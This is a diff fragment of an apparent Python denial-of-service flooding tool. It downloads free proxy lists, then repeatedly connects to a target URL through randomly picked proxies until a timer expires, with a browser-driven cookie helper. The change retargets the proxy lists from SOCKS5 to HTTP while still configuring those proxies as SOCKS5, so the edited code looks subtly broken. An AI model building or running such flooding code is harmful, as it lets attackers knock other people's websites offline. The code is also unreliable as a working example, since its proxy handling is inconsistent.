@@ -219,21 +219,21 @@ def get_cookies(driver):
     return ";".join(pieces)
 
 def socks5geter():
-    prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
-    prapi2 = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&timeout=1000"
-    prapi3 = "https://www.proxy-list.download/api/v1/get?type=socks5"
-    pf = open('socks5.txt', 'w+')
+    prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
+    prapi2 = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=1000"
+    prapi3 = "https://www.proxy-list.download/api/v1/get?type=http"
+    pf = open('theprxy.txt', 'w+')
     rq = (get(prapi1).text).split()
     for pyy in rq:
         pf.write(pyy + '\n')
     pf.close()
-    pf = open('socks5.txt' , 'a')
+    pf = open('theprxy.txt' , 'a')
     rq = (get(prapi2).text).split()
     pf.write('\n')
     for pyy in rq:
         pf.write(pyy + '\n')
     pf.close()
-    pf = open('socks5.txt' , 'a')
+    pf = open('theprxy.txt' , 'a')
     rq = (get(prapi3).text).split()
     pf.write('\n')
     for pyy in rq:
@@ -363,7 +363,7 @@ def main():
                 while time() < timer:
                     try:
                         if url.split('://')[0] == 'https':
-                            sok5 = open('socks5.txt' , 'r').read().split()
+                            sok5 = open('theprxy.txt' , 'r').read().split()
                             s = socksocket()
                             s = socket.create_connection(target , port)
                             pri = che(sok5).split(':');
@@ -606,7 +606,7 @@ def main():
                 while time() < timer:
                     try:
                         if url.split('://')[0] == 'https':
-                            sok5 = open('socks5.txt' , 'r').read().split()
+                            sok5 = open('theprxy.txt' , 'r').read().split()
                             s = socksocket()
                             s = socket.create_connection(target , port)
                             pri = che(sok5).split(':');
@@ -649,7 +649,7 @@ def main():
                 while time() < timer:
                     try:
                         if url.split('://')[0] == 'https':
-                            sok5 = open('socks5.txt' , 'r').read().split()
+                            sok5 = open('theprxy.txt' , 'r').read().split()
                             s = socksocket()
                             pri = che(sok5).split(':');
                             s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
